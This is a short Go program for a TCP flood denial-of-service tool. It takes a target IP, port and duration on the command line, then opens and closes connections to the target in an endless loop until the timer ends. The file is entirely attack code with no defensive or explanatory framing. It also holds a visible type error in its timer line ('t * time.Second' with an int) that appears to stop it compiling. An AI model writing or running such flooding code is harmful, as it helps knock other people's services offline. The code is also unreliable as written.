package main

import (
    "fmt"
    "net"
    "os"
    "time"
    "strconv"
)

func main() {
    // Check if correct number of arguments is provided
    if len(os.Args) != 4 {
        fmt.Printf("[ X ] Error, Invalid arguments provided....!\r\nUsage: %s <ip> <port> <time>\n", os.Args[0])
        os.Exit(1)
    }

    // Start the timer
    t, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("[ X ] Error converting time:", err)
        os.Exit(1)
    }
    go timer(t)

    // Infinite loop to perform TCP flood
    for {
        tcpFlood(os.Args[1], os.Args[2], "")
    }
}

// Timer function to sleep for specified time
func timer(t int) {
    time.Sleep(t * time.Second)
    fmt.Println("[ ! ] Attack duration expired. Exiting...")
    os.Exit(0)
}

// TCP flood function
func tcpFlood(ip, port, data string) {
    servAddr := fmt.Sprintf("%s:%s", ip, port)
    tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
    if err != nil {
        fmt.Println("[ X ] Error resolving TCP address:", err)
        return
    }

    conn, err := net.DialTCP("tcp", nil, tcpAddr)
    if err != nil {
        fmt.Println("[ X ] Error connecting to TCP server:", err)
        return
    }

    fmt.Println("[ + ] TCP packet sent to", servAddr)

    conn.Close()
}